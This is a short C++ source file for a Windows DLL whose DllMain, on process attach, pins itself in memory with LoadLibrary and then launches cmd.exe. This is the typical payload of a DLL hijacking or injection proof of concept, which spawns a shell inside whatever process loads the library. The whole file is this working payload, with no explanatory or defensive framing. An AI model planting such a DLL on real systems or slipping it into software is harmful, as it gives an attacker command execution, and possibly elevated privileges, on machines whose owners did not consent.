// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <windows.h>

#pragma comment(lib,"User32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        // Increase the DLL's reference count
        TCHAR szModulePath[MAX_PATH];
        if (GetModuleFileName(hModule, szModulePath, MAX_PATH))
        {
            LoadLibrary(szModulePath);
        }
        // Create a new console with cmd.exe running
        STARTUPINFO si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        wchar_t cmd[] = L"cmd.exe";  // non-const wchar_t array

        if (!CreateProcess(NULL,   // No module name (use command line)
            cmd,        // Command line
            NULL,           // Process handle not inheritable
            NULL,           // Thread handle not inheritable
            FALSE,          // Set handle inheritance to FALSE
            0,              // No creation flags
            NULL,           // Use parent's environment block
            NULL,           // Use parent's starting directory 
            &si,            // Pointer to STARTUPINFO structure
            &pi)           // Pointer to PROCESS_INFORMATION structure
            )
        {
            return FALSE;
        }
        // Close process and thread handles. 
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

